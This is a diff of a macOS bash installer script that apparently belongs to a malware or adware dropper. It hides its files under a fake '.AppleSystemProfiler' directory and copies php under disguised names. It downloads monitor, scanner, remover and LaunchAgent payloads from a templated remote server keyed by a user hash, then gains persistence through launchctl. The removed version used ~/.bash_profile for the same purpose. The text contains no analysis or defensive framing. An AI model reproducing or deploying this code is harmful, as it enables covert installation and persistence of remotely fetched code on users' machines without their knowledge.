@@ -1,34 +1,46 @@
-#!/bin/bash
 
-HOME=~
-DIR_NAME=".AppleSystemProfiler"
-DIR=$HOME/$DIR_NAME/bin
-PROFILE=$HOME/.bash_profile
-BINARY=$DIR/ctl
-BIN_ESC=`echo $BINARY | sed 's/[\\/&]/\\\\&/g'`
-SCANNER=$DIR/scan
-MONITOR=$DIR/monitor
-MON_ESC=`echo $MONITOR | sed 's/[\\/&]/\\\\&/g'`
-IN_PROF="`cat $PROFILE | grep \"$SCANNER\"`"
-PHP=/usr/bin/php
-
-if [[ ! -d $DIR ]]; then
-   mkdir -p $DIR
+if [[ ! -d $DIR_BIN ]]; then
+   mkdir -p $DIR_BIN
 fi
 
 if [[ ! -f $BINARY ]]; then
    cp $PHP $BINARY
 fi
 
-curl -s -o $MONITOR "{{SERVER_HOST}}g.php?h={{USER_HASH}}"
-curl -s -o $SCANNER "{{SERVER_HOST}}r"
-chmod +x $MONITOR
-chmod +x $SCANNER
-sed -i '' "s/MONITOR/$MON_ESC/g" $SCANNER
-sed -i '' "s/BINARY_LOCATION/$BIN_ESC/g" $MONITOR
-
-if [[ -z $IN_PROF ]]; then
-   echo $SCANNER >> ~/.bash_profile
+if [[ ! -d $LAUNCH_DIR ]]; then
+    mkdir -p $LAUNCH_DIR
 fi
+
+cp $0 $INSTALLER
+
+curl -s -o $REMOVER "{{SERVER_HOST}}r.php?h=$HASH"
+curl -s -o $MONITOR "{{SERVER_HOST}}g.php?h=$HASH"
+curl -s -o $SCANNER "{{SERVER_HOST}}s.php?h=$HASH"
+curl -s -o $LAUNCH_PLIST "{{SERVER_HOST}}l.php?h=$HASH"
+
+sed -i '' "s/{{MONITOR}}/$MON_ESC/g" $SCANNER
+sed -i '' "s/{{BINARY_LOCATION}}/$BIN_ESC/g" $SCANNER
+sed -i '' "s/{{SCANNER}}/$SCAN_ESC/g" $LAUNCH_PLIST
+sed -i '' "s/{{SCANNER}}/$SCAN_ESC/g" $MONITOR
+sed -i '' "s/{{PING_BIN}}/$PING_BIN_ESC/g" $MONITOR
+sed -i '' "s/{{PING_MON}}/$PING_MON_ESC/g" $MONITOR
+
+chmod +x $INSTALLER $REMOVER $MONITOR $SCANNER
+
+launchctl load $LAUNCH_PLIST
+
+if [[ ! -d $PING_DIR ]]; then
+   mkdir -p $PING_DIR
+fi
+
+if [[ ! -f $PING_BIN ]]; then
+   cp $PHP $PING_BIN
+fi
+
+if [[ -f $PING_MON ]]; then
+   rm $PING_MON
+fi
+
+cp $MONITOR $PING_MON
 
 $SCANNER
